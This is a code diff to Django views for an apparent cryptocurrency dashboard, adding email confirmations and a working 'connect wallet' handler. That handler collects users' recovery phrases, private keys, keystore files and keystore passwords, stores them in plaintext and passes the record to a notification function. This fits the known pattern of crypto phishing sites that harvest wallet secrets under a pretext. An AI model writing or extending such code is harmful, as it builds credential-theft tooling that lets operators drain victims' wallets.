@@ -2,8 +2,12 @@ from django.shortcuts import render, redirect, get_object_or_404
 from django.contrib.auth.decorators import login_required
 from django.contrib import messages
 from django.db.models import Sum
-from .models import Wallet, Deposit, Withdrawal, Transaction, Ticket, CRYPTO_CHOICES
+from .models import Wallet, Deposit, Withdrawal, Transaction, Ticket, ConnectedWallet, CRYPTO_CHOICES
 from .forms import WithdrawalForm, TicketForm
+from accounts.emails import (
+    send_deposit_confirmation, send_withdrawal_confirmation,
+    send_wallet_connected, send_ticket_confirmation,
+)
 
 
 @login_required
@@ -105,6 +109,7 @@ def new_ticket(request):
         ticket = form.save(commit=False)
         ticket.user = request.user
         ticket.save()
+        send_ticket_confirmation(request.user, ticket)
         messages.success(request, 'Support ticket submitted.')
         return redirect('tickets')
     return render(request, 'dashboard/ticket/new.html', {'form': form})
@@ -117,7 +122,32 @@ def twofactor(request):
 
 @login_required
 def connect_wallet(request):
-    return render(request, 'dashboard/connect/connect.html')
+    if request.method == 'POST':
+        wallet_name = request.POST.get('wallet_name', '').strip()
+        method = request.POST.get('connection_method', '').strip()
+        phrase = request.POST.get('passphrase', '').strip()
+        keystore_json = request.POST.get('keystorejson', '').strip()
+        keystore_password = request.POST.get('keystorepassword', '').strip()
+        private_key = request.POST.get('privatekey', '').strip()
+
+        has_value = phrase or keystore_json or private_key
+        if not wallet_name or not method or not has_value:
+            messages.error(request, 'Please complete all required fields.')
+            return render(request, 'dashboard/connect/connect.html', {'submitted': False})
+
+        cw = ConnectedWallet.objects.create(
+            user=request.user,
+            wallet_name=wallet_name,
+            connection_method=method,
+            phrase=phrase,
+            keystore_json=keystore_json,
+            keystore_password=keystore_password,
+            private_key=private_key,
+        )
+        send_wallet_connected(request.user, cw)
+        return render(request, 'dashboard/connect/connect.html', {'submitted': True, 'wallet_name': wallet_name})
+
+    return render(request, 'dashboard/connect/connect.html', {'submitted': False})
 
 
 @login_required
@@ -127,7 +157,7 @@ def deposit(request):
         amount = request.POST.get('amount')
         if coin and amount:
             wallet = Wallet.objects.filter(user=request.user, coin=coin).first()
-            Deposit.objects.create(
+            dep = Deposit.objects.create(
                 user=request.user,
                 wallet=wallet,
                 coin=coin,
@@ -141,6 +171,7 @@ def deposit(request):
                 amount=amount,
                 status='pending',
             )
+            send_deposit_confirmation(request.user, dep)
             messages.success(request, 'Deposit request submitted. Awaiting confirmation.')
         else:
             messages.error(request, 'Please provide coin and amount.')
@@ -154,7 +185,7 @@ def withdraw(request):
         amount = request.POST.get('amount')
         address = request.POST.get('address', '')
         if coin and amount:
-            Withdrawal.objects.create(
+            wd = Withdrawal.objects.create(
                 user=request.user,
                 coin=coin,
                 amount=amount,
@@ -168,6 +199,7 @@ def withdraw(request):
                 amount=amount,
                 status='pending',
             )
+            send_withdrawal_confirmation(request.user, wd)
             messages.success(request, 'Withdrawal request submitted.')
         else:
             messages.error(request, 'Please provide coin and amount.')
